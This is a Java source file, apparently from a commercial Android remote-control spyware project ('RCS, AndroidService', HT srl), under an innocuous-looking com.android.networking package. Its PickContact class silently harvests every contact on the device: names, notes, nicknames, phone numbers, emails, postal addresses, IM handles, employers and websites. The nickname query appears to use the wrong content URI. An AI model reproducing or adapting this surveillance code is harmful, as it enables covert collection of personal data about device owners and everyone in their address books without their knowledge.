/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : PickContact.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.module.task;

import java.util.ArrayList;
import java.util.Hashtable;
import java.util.List;
import java.util.ListIterator;

import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.BaseColumns;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Nickname;
import android.provider.ContactsContract.CommonDataKinds.Note;
import android.provider.ContactsContract.CommonDataKinds.Phone;

import com.android.networking.Status;

public class PickContact {
	private static final String TAG = "PickContact"; //$NON-NLS-1$

	private void addUserPhones(ContentResolver cr, Cursor cursor, Hashtable<Long, Contact> contacts) {

		final long userId = cursor.getLong(cursor.getColumnIndex(BaseColumns._ID));
		final long hasPhone = cursor.getLong(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));

		if (hasPhone > 0) {
			final String phoneWhere = Phone.CONTACT_ID + " = ? "; //$NON-NLS-1$
			final String[] phoneWhereParams = new String[] { userId + "" }; //$NON-NLS-1$
			final Cursor phoneCursor = cr.query(Phone.CONTENT_URI, null, phoneWhere, phoneWhereParams, null);

			while (phoneCursor.moveToNext()) {
				final int phoneType = phoneCursor.getInt(phoneCursor.getColumnIndex(Phone.TYPE));

				final String phoneValue = phoneCursor.getString(phoneCursor.getColumnIndex(Phone.NUMBER));

				if (contacts.containsKey(userId)) {
					Contact contact = contacts.get(userId);
					contact.add(new PhoneInfo(userId, phoneType, phoneValue));
				}
			}

			phoneCursor.close();
		}

	}

	private void addUserEmails(ContentResolver cr, Cursor cursor, Hashtable<Long, Contact> contacts) {

		final long userId = cursor.getLong(cursor.getColumnIndex(BaseColumns._ID));

		final Cursor emailCur = cr.query(Email.CONTENT_URI, null, Email.CONTACT_ID + " = ?", new String[] { userId //$NON-NLS-1$
				+ "" }, null); //$NON-NLS-1$

		while (emailCur.moveToNext()) {
			final String email = emailCur.getString(emailCur.getColumnIndex(Email.DATA));
			final int emailType = emailCur.getInt(emailCur.getColumnIndex(Email.TYPE));

			if (contacts.containsKey(userId)) {
				Contact contact = contacts.get(userId);
				contact.add(new EmailInfo(userId, emailType, email));
			}
		}

		emailCur.close();

	}

	private void addUserInfos(ContentResolver cr, Cursor cursor, Hashtable<Long, Contact> contacts) {

		String userNote = null;
		String userNickName = null;

		final String userName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
		final long userId = cursor.getLong(cursor.getColumnIndex(BaseColumns._ID));

		final String noteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE //$NON-NLS-1$
				+ " = ?"; //$NON-NLS-1$
		final String[] noteWhereParams = new String[] { userId + "", Note.CONTENT_ITEM_TYPE }; //$NON-NLS-1$

		final Cursor noteCur = cr.query(ContactsContract.Data.CONTENT_URI, null, noteWhere, noteWhereParams, null);

		if (noteCur.moveToFirst()) {
			userNote = noteCur.getString(noteCur.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
		}

		noteCur.close();

		final String nickNameWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " //$NON-NLS-1$
				+ ContactsContract.Data.MIMETYPE + " = ?"; //$NON-NLS-1$

		final String[] nickNameWhereParams = new String[] { userId + "", Nickname.CONTENT_ITEM_TYPE }; //$NON-NLS-1$

		final Cursor nickCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, nickNameWhere,
				nickNameWhereParams, null);

		if (nickCursor.moveToFirst()) {
			userNickName = nickCursor.getString(nickCursor
					.getColumnIndex(ContactsContract.CommonDataKinds.Nickname.NAME));
		}

		nickCursor.close();
		contacts.put(userId, new Contact(new UserInfo(userId, userName, userNote, userNickName)));

	}

	private void addUserPA(ContentResolver cr, Cursor cursor, Hashtable<Long, Contact> contacts) {

		final long userId = cursor.getLong(cursor.getColumnIndex(BaseColumns._ID));
		final String addrWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE //$NON-NLS-1$
				+ " = ?"; //$NON-NLS-1$

		final String[] addrWhereParams = new String[] { userId + "", //$NON-NLS-1$
				ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE };

		final Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI, null, addrWhere, addrWhereParams, null);

		while (addrCur.moveToNext()) {
			final String poBox = addrCur.getString(addrCur
					.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POBOX));
			final String street = addrCur.getString(addrCur
					.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
			final String city = addrCur.getString(addrCur
					.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
			final String state = addrCur.getString(addrCur
					.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
			final String postalCode = addrCur.getString(addrCur
					.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
			final String country = addrCur.getString(addrCur
					.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
			final String neighbor = addrCur.getString(addrCur
					.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.NEIGHBORHOOD));
			final int type = addrCur.getInt(addrCur
					.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));

			if (contacts.containsKey(userId)) {
				Contact contact = contacts.get(userId);
				contact.add(new PostalAddressInfo(userId, type, street, poBox, neighbor, city, state, postalCode,
						country));
			}
		}

		addrCur.close();

	}

	private void addUserIm(ContentResolver cr, Cursor cursor, Hashtable<Long, Contact> contacts) {

		final long userId = cursor.getLong(cursor.getColumnIndex(BaseColumns._ID));

		final String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE //$NON-NLS-1$
				+ " = ? "; //$NON-NLS-1$
		final String[] imWhereParams = new String[] { userId + "", //$NON-NLS-1$
				ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE };
		final Cursor imCursor = cr.query(ContactsContract.Data.CONTENT_URI, null, imWhere, imWhereParams, null);

		while (imCursor.moveToNext()) {
			final int imType = imCursor.getInt(imCursor.getColumnIndex(ContactsContract.CommonDataKinds.Im.PROTOCOL));
			final String imValue = imCursor
					.getString(imCursor.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));

			if (contacts.containsKey(userId)) {
				Contact contact = contacts.get(userId);
				contact.add(new ImInfo(userId, imType, imValue));
			}
		}

		imCursor.close();

	}

	private void addUserOrg(ContentResolver cr, Cursor cursor, Hashtable<Long, Contact> contacts) {

		final int userId = cursor.getInt(cursor.getColumnIndex(BaseColumns._ID));

		final String orgWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE //$NON-NLS-1$
				+ " = ? "; //$NON-NLS-1$
		final String[] orgWhereParams = new String[] { userId + "", //$NON-NLS-1$
				ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE };

		final Cursor orgCursor = cr.query(ContactsContract.Data.CONTENT_URI, null, orgWhere, orgWhereParams, null);

		while (orgCursor.moveToNext()) {
			final String companyName = orgCursor.getString(orgCursor
					.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
			final String companyTitle = orgCursor.getString(orgCursor
					.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
			final int type = orgCursor.getInt(orgCursor
					.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TYPE));

			if (contacts.containsKey(userId)) {
				Contact contact = contacts.get(userId);
				contact.add(new OrganizationInfo(userId, type, companyName, companyTitle));
			}
		}

		orgCursor.close();

	}

	private void addUserWebsite(ContentResolver cr, Cursor cursor, Hashtable<Long, Contact> contacts) {

		final long userId = cursor.getInt(cursor.getColumnIndex(BaseColumns._ID));
		final String websiteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE //$NON-NLS-1$
				+ " = ? "; //$NON-NLS-1$
		final String[] websiteWhereParams = new String[] { userId + "", //$NON-NLS-1$
				ContactsContract.CommonDataKinds.Website.CONTENT_ITEM_TYPE };

		final Cursor webCursor = cr.query(ContactsContract.Data.CONTENT_URI, null, websiteWhere, websiteWhereParams,
				null);

		while (webCursor.moveToNext()) {
			final String websiteName = webCursor.getString(webCursor
					.getColumnIndex(ContactsContract.CommonDataKinds.Website.URL));

			if (contacts.containsKey(userId)) {
				Contact contact = contacts.get(userId);
				contact.add(new WebsiteInfo(userId, websiteName));
			}
		}

		webCursor.close();

	}

	public Hashtable<Long, Contact> getContactInfo() {
		final ContentResolver cr = Status.getAppContext().getContentResolver();

		Hashtable<Long, Contact> contacts = new Hashtable<Long, Contact>();
		final Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		final int size = cursor.getCount();

		while (cursor.moveToNext()) {

			addUserInfos(cr, cursor, contacts);
			addUserEmails(cr, cursor, contacts);
			addUserPA(cr, cursor, contacts);
			addUserPhones(cr, cursor, contacts);
			addUserIm(cr, cursor, contacts);
			addUserOrg(cr, cursor, contacts);
			addUserWebsite(cr, cursor, contacts);
		}
		cursor.close();

		return contacts;
	}
}
